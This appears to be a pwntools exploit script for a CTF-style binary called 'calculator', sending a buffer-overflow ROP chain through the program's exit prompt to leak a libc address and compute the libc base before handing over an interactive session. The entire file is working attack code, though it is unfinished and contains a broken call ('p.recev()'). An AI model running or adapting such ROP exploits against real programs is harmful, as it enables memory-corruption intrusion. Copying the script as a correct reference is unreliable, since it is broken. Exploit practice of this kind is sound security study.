from pwn import *
context.arch = "amd64"
p = process('./calculator')
l = ELF("./libc.so.6")

#p = remote()
pop_rdi = 0x000000000040119a
ret = 0x0000000000401016
libc_start_main = 0x0000000000403fd8
put_plt = 0x0000000000404000
test = 0x0000000000404028
print_plt = 0x0000000000404008
main = 0x00000000004014e6
printf_offset = 0x606f0
payload = b'y' * 1 + b'a' * 3 + b'a' * 8 + p64(pop_rdi)   + p64(print_plt) + p64(put_plt) +p64(ret) + p64(main)

p.sendlineafter('Input :','q')

p.sendafter('Are you sure you want to leave? [Y/n]',payload)
l.address = u64(p.recv(6).ljust(8, b"\0")) - printf_offset


p.recev()



p.interactive()


